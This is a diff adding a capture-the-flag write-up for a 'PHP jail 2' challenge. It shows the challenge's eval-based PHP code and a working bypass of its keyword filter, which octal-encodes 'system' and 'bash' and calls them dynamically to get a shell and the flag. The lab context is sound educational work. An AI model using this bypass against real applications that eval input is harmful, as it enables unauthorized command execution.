@@ -723,7 +723,60 @@ level1@lxc20-php-jail:~$ cat flag.txt
 FLAG-sW66QEY4y6724723c7w1i0oMt179E75y
 ```
 
+## PHP jail 2 
+```php
+<?php
+array_shift($_SERVER['argv']);
+$var = implode(" ", $_SERVER['argv']);
 
+if($var == null) die("PHP Jail need an argument\n");
+
+function filter($var) {
+        if(preg_match('/(\/|a|c|s|require|include|flag|eval|file)/i', $var)) {
+                return false;
+        }
+        return true;
+}
+if(filter($var)) {
+        eval($var);
+        echo "Command executed";
+} else {
+        echo "Restricted characters has been used";
+}
+echo "\n";
+?>
+```
+Again we see the PHP code used for the jail.
+And again the eval instruction is used to evaluate and execute the input data and some
+keywords and characters are prohibited for these input data.
+With these prohibited keywords and characters, I can not use my solutions of the previous
+PHP jail challenge.
+We must find another way. There are numerous ways in particular. Here I suggest using
+any PHP function.
+Firstly we can use hexadecimal or octal strings which will be decoded using double quoted
+strings. So any string can be used for our PHP code in input data. Because of prohibited
+characters, the octal strings are better.
+Secondly we can use PHP variables (the dollar sign is not prohibited). So we can do a
+dynamic call of PHP function using a function name in a string variable.
+
+```assembly
+┌─[root@parrot]─[~]
+└──╼ #cat /usr/bin/phpjail
+echo -n $1 | hexdump -ve '"\\\\" /1 "%o"' ; echo
+┌─[root@parrot]─[~]
+└──╼ #phpjail system
+\\163\\171\\163\\164\\145\\155
+┌─[root@parrot]─[~]
+└──╼ #phpjail bash
+\\142\\141\\163\\150
+```
+```assembly
+$f = "\\163\\171\\163\\164\\145\\155" ; $f("\\142\\141\\163\\150");
+level2@lxc20-php-jail:~$ cat flag.txt
+FLAG-YlxV8cCg84zvUtt595dla5un9EW57BCL
+```
+
+![screenshot at 2018-08-09 17-10-16](https://user-images.githubusercontent.com/22657154/43908249-c7dec0fc-9bf7-11e8-8c29-49b73ca48061.png)
 
 
 
